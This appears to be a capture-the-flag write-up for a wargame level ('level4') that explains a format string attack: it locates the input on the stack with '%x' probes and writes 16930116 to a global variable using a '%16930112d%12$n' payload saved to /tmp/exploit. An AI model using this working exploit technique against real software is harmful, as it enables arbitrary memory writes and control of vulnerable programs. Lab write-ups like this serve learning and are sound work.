In this program we have the main that calls the function n() that has the function p() where printf is located:

after the p() being called the return value is being compare in:
0x0804848d <+54>: mov 0x8049810,%eax
0x08048492 <+59>: cmp $0x1025544,%eax

it compares the variable to the number 16930116 (0x1025544)

Same thing as the previous level we have to find the position of our argument
python -c 'print "aaaa" + "%x " * 15' | ./level4
aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 61616161 2078252

we can see that our argument is at the 12th position (61616161)

the difference between the last level and this one is that we have to write the value 16930116 in the 12th position of our argument
but we can't write it directly because it's too big so we use the modifier %d to write the number of bytes specified before in the choosen address. We can specify the address with %[number]$n option.
so our final format string attack will look like:

dont forget to remove the 4 bytes from the total number of bytes to write (16930116 - 4 = 16930112)

python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit

cat /tmp/exploit - | ./level4
